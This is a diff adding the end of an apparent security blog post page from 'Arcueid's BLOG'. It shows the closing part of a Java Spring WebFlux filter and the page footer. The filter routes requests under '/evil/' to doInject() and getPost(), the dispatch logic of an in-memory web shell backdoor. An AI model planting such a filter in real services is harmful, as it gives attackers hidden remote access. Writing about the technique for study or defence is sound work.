+    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, WebFilterChain chain) &#123;
+        if (exchange.getRequest().getURI().getPath().startsWith(&quot;/evil/&quot;)) &#123;
+            doInject();
+            Flux&lt;DataBuffer&gt; response = getPost(exchange);
+            ServerHttpResponse serverHttpResponse = exchange.getResponse();
+            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);
+            return serverHttpResponse.writeWith(response);
+        &#125; else &#123;
+            return chain.filter(exchange);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
